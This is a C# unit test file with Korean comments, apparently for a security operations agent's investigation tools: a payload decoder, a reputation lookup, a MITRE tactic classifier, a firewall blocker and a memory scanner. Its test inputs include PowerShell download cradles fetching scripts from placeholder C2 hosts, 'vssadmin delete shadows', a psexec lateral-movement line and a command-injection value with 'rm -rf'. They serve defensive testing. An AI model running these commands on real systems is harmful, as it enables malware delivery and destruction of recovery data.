using System.Text;
using Phalanx.Cockpit.Tools;
using Xunit;

namespace Phalanx.Agent.Tests;

[Trait("Category", "Unit")]
public class InvestigationToolsTests
{
    [Fact]
    public async Task TestDecodePayloadToolWithBase64AndUrls()
    {
        var tool = new DecodePayloadTool();

        // 모의 PowerShell -enc Base64 커맨드라인 (UTF-16LE 인코딩)
        string rawScript = "powershell.exe -nop -c (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string base64Payload = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCommand = $"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -enc {base64Payload}";

        var result = await tool.ExecuteAsync(new() { ["encodedCommand"] = fullCommand });

        Assert.True(result.Success);
        Assert.NotNull(result.Data);

        var urls = result.Data["ExtractedUrls"] as List<string>;
        var ips = result.Data["ExtractedIps"] as List<string>;

        Assert.NotNull(urls);
        Assert.Contains(urls, u => u.Contains("185.220.101.5"));
        Assert.NotNull(ips);
        Assert.Contains("185.220.101.5", ips);
    }

    [Fact]
    public async Task TestThreatReputationToolKnownAndUnknown()
    {
        var tool = new ThreatReputationTool();

        // 1. 알려진 악성 C2 IP 조회
        var res1 = await tool.ExecuteAsync(new() { ["targetIndicator"] = "185.220.101.5" });
        Assert.True(res1.Success);
        Assert.Equal("HIGH_RISK_MALICIOUS", res1.Data?["Verdict"]);
        Assert.Equal(98, res1.Data?["Score"]);
        Assert.Equal("APT29 (Cozy Bear)", res1.Data?["ThreatGroup"]);

        // 2. 정상 루프백 주소 조회
        var res2 = await tool.ExecuteAsync(new() { ["targetIndicator"] = "127.0.0.1" });
        Assert.True(res2.Success);
        Assert.Equal(0, res2.Data?["Score"]);
        Assert.Equal("BENIGN", res2.Data?["Verdict"]);
    }

    [Fact]
    public async Task TestMitreClassifierToolMapping()
    {
        var tool = new MitreClassifierTool();

        string sampleBehavior = "winword.exe -> powershell.exe -enc dGVzdA== (C2 Download: http://evil.com/beacon.exe) vssadmin delete shadows";
        var res = await tool.ExecuteAsync(new() { ["observedBehavior"] = sampleBehavior });

        Assert.True(res.Success);
        var tactics = res.Data?["TacticIds"] as List<string>;
        Assert.NotNull(tactics);
        Assert.Contains("T1566.001", tactics); // Spearphishing Attachment (Office LOLBAS)
        Assert.Contains("T1059.001", tactics); // PowerShell
        Assert.Contains("T1071.001", tactics); // Web Protocols
        Assert.Contains("T1490", tactics);     // Inhibit System Recovery (vssadmin)
    }

    [Fact]
    public async Task TestSystemFirewallToolClampingAndExecution()
    {
        var tool = new SystemFirewallTool();

        // 1. 잘못된 IP 검증 거부
        var badRes = await tool.ExecuteAsync(new() { ["maliciousIp"] = "999.999.999.999; rm -rf" });
        Assert.False(badRes.Success);

        // 2. 특수 루프백 주소 가드 거부
        var loopbackRes = await tool.ExecuteAsync(new() { ["maliciousIp"] = "127.0.0.1" });
        Assert.False(loopbackRes.Success);

        // 3. 정상 악성 IP 룰 집행 (시뮬레이션 또는 실제 netsh)
        var validRes = await tool.ExecuteAsync(new() { ["maliciousIp"] = "185.220.101.5" });
        Assert.True(validRes.Success);
        Assert.Equal("185.220.101.5", validRes.Data?["BlockedIp"]);
    }

    [Fact]
    public async Task TestProcessMemoryScanToolSelfProcess()
    {
        var tool = new ProcessMemoryScanTool();
        uint currentPid = (uint)System.Diagnostics.Process.GetCurrentProcess().Id;

        var res = await tool.ExecuteAsync(new() { ["targetPid"] = currentPid });
        Assert.True(res.Success);
        Assert.NotNull(res.Data);
        Assert.True((long)res.Data["ScannedBytes"] >= 0);
    }

    [Fact]
    public async Task TestDecodePayloadToolWithGzipAndHex()
    {
        var tool = new DecodePayloadTool();

        // 1. Gzip 압축된 파워셸 스크립트 해독 (실전 드로퍼 패턴)
        string rawScript = "powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadString('http://evil-c2.darknet/beacon.ps1')";
        byte[] rawBytes = Encoding.Unicode.GetBytes(rawScript);

        using var ms = new MemoryStream();
        using (var gz = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Compress))
        {
            gz.Write(rawBytes, 0, rawBytes.Length);
        }
        string gzipBase64 = Convert.ToBase64String(ms.ToArray());
        string gzipCmd = $"powershell.exe -enc {gzipBase64}";

        var resGz = await tool.ExecuteAsync(new() { ["encodedCommand"] = gzipCmd });
        Assert.True(resGz.Success);
        var urls = resGz.Data?["ExtractedUrls"] as List<string>;
        Assert.NotNull(urls);
        Assert.Contains("http://evil-c2.darknet/beacon.ps1", urls);

        // 2. Hex 인코딩된 스크립트 해독
        string hexScript = "cmd.exe /c whoami";
        string hexPayload = Convert.ToHexString(Encoding.ASCII.GetBytes(hexScript));
        var resHex = await tool.ExecuteAsync(new() { ["encodedCommand"] = hexPayload });
        Assert.True(resHex.Success);
        Assert.Contains("whoami", resHex.Data?["DecodedPayload"]?.ToString());
    }

    [Fact]
    public async Task TestThreatReputationToolRfc1918AndPortSanitization()
    {
        var tool = new ThreatReputationTool();

        // 1. RFC 1918 B클래스 (172.16.0.0/12) - 과거 75점 오탐 버그 해결 검증
        var resB = await tool.ExecuteAsync(new() { ["targetIndicator"] = "172.20.10.55" });
        Assert.True(resB.Success);
        Assert.Equal(0, resB.Data?["Score"]);
        Assert.Equal("BENIGN_INTERNAL", resB.Data?["Verdict"]);

        // 2. 포트 포함된 C2 IP (185.220.101.5:443) 정상 파싱 및 IoC 검출
        var resPort = await tool.ExecuteAsync(new() { ["targetIndicator"] = "185.220.101.5:443" });
        Assert.True(resPort.Success);
        Assert.Equal(98, resPort.Data?["Score"]);
        Assert.Equal("HIGH_RISK_MALICIOUS", resPort.Data?["Verdict"]);

        // 3. 디팽된 C2 IP (185[.]220[.]101[.]5)
        var resDefang = await tool.ExecuteAsync(new() { ["targetIndicator"] = "185[.]220[.]101[.]5" });
        Assert.True(resDefang.Success);
        Assert.Equal(98, resDefang.Data?["Score"]);

        // 4. Anycast DNS (1.1.1.1) 화이트리스트 0점
        var resDns = await tool.ExecuteAsync(new() { ["targetIndicator"] = "1.1.1.1" });
        Assert.True(resDns.Success);
        Assert.Equal(0, resDns.Data?["Score"]);
        Assert.Equal("BENIGN", resDns.Data?["Verdict"]);

        // 5. 미확인 외부 공인 IP - 75점 오탐 폭탄 제거 -> 30점 중립 판정 검증
        var resUnknown = await tool.ExecuteAsync(new() { ["targetIndicator"] = "198.51.100.25" });
        Assert.True(resUnknown.Success);
        Assert.Equal(30, resUnknown.Data?["Score"]);
        Assert.Equal("INCONCLUSIVE_EXTERNAL_IP", resUnknown.Data?["Verdict"]);
    }

    [Fact]
    public async Task TestMitreClassifierToolWordBoundariesAndKillChain()
    {
        var tool = new MitreClassifierTool();

        // 1. 단어 경계 검증: c2rsetup.exe(Office 정상)는 C2(T1071.001)로 오탐되지 않아야 함
        var benignRes = await tool.ExecuteAsync(new() { ["observedBehavior"] = "c2rsetup.exe /update client.exe" });
        Assert.True(benignRes.Success);
        var benignTactics = benignRes.Data?["TacticIds"] as List<string>;
        Assert.NotNull(benignTactics);
        Assert.DoesNotContain("T1071.001", benignTactics);
        Assert.DoesNotContain("T1059.001", benignTactics);

        // 2. 다단계 공격 킬체인 정렬 검증 (Discovery -> Lateral Movement -> Impact)
        string complexAttack = "vssadmin.exe delete shadows & net user & psexec.exe \\\\target cmd";
        var resAttack = await tool.ExecuteAsync(new() { ["observedBehavior"] = complexAttack });
        Assert.True(resAttack.Success);
        var tactics = resAttack.Data?["TacticIds"] as List<string>;
        Assert.NotNull(tactics);
        Assert.Contains("T1087", tactics);     // Account Discovery
        Assert.Contains("T1021.002", tactics); // Lateral Movement: SMB/Admin Shares
        Assert.Contains("T1490", tactics);     // Impact: Inhibit Recovery
    }

    [Fact]
    public async Task TestSystemFirewallToolInfrastructureGuardsAndUnblock()
    {
        var tool = new SystemFirewallTool();

        // 1. 호스트 루프백 127.0.0.1 가드
        var loopRes = await tool.ExecuteAsync(new() { ["maliciousIp"] = "127.0.0.1" });
        Assert.False(loopRes.Success);

        // 2. 브로드캐스트 255.255.255.255 가드
        var bcastRes = await tool.ExecuteAsync(new() { ["maliciousIp"] = "255.255.255.255" });
        Assert.False(bcastRes.Success);

        // 3. 정상 격리 해제 (unblock 액션)
        var unblockRes = await tool.ExecuteAsync(new() { ["maliciousIp"] = "185.220.101.5", ["action"] = "unblock" });
        Assert.True(unblockRes.Success);
        Assert.Equal("unblock", unblockRes.Data?["Action"]);
    }

    [Fact]
    public async Task TestProcessMemoryScanToolProtectedProcessGuard()
    {
        var tool = new ProcessMemoryScanTool();

        // PID 4 (System) 스캔 거부 안전 가드 검증
        var res = await tool.ExecuteAsync(new() { ["targetPid"] = 4 });
        Assert.False(res.Success);
        Assert.Contains("안전 가드", res.Output);
    }
}
